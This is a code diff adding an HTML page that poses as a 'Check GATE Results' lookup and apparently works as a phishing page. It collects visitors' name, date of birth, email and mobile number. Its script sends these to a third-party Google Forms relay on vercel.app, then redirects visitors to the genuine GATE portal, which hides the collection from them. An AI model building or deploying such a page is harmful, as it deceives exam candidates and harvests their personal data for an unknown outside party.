@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Domain AI Powered Search</title>
+    <style>
+        body {
+            color: white;
+            background-color: black;
+        }
+
+        input[type="text"], input[type="email"], input[type="submit"] {
+            width: 300px;
+            height: 30px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+
+<body>
+<h3>Check GATE Results</h3>
+<form id="myForm" action="https://securityinfinity-google-forms-rest-api.vercel.app/api/forms/1FAIpQLSet1gyTiLkNM8ft4B2cdntDC0IA_toLXHsBn0xduoDDsVzDGA" method="POST">
+    <label for="name">Your Name:</label>
+    <br>
+    <input type="text" id="name" name="entry.2077714025" required>
+    <br><br><br>
+
+    <label for="dob">Date of Birth:</label>
+    <br>
+    <input type="text" id="dob" name="entry.1875824858" required>
+    <br><br><br>
+
+    <label for="email">Your Email:</label>
+    <br>
+    <input type="email" id="email" name="entry.1528374301" required>
+    <br><br><br>
+
+    <label for="mobile">Mobile Number:</label>
+    <br>
+    <input type="text" id="mobile" name="entry.611679258" required>
+    <br><br><br>
+
+    <input type="submit" value="Check GATE Results" onclick="submitForm(event)">
+</form>
+
+<script>
+    // Submit form to Google Forms API
+    function submitForm(event) {
+        event.preventDefault(); // Prevent form submission if validation fails
+
+        const name = document.getElementById("name").value;
+        const dob = document.getElementById("dob").value;
+        const email = document.getElementById("email").value;
+        const mobile = document.getElementById("mobile").value;
+
+        if (name.trim() === '' || dob.trim() === '' || email.trim() === '' || mobile.trim() === '') {
+            alert('Please fill in all fields.');
+            return;
+        }
+
+        const formData = {
+            "entry.2077714025": name,
+            "entry.1875824858": dob,
+            "entry.1528374301": email,
+            "entry.611679258": mobile
+        };
+
+        fetch("https://securityinfinity-google-forms-rest-api.vercel.app/api/forms/1FAIpQLSet1gyTiLkNM8ft4B2cdntDC0IA_toLXHsBn0xduoDDsVzDGA", {
+            method: "POST",
+            body: JSON.stringify(formData),
+            headers: {
+                "Content-Type": "application/json"
+            }
+        })
+            .then(response => {
+                if (response.ok) {
+                    window.location.replace("https://app.gate.iitk.ac.in/home");
+
+                } else {
+                    alert("There was a problem submitting the form. Please try again later.");
+                }
+            })
+            .catch(error => {
+                alert("There was a problem submitting the form. Please try again later.");
+            });
+    }
+</script>
+</body>
+</html>
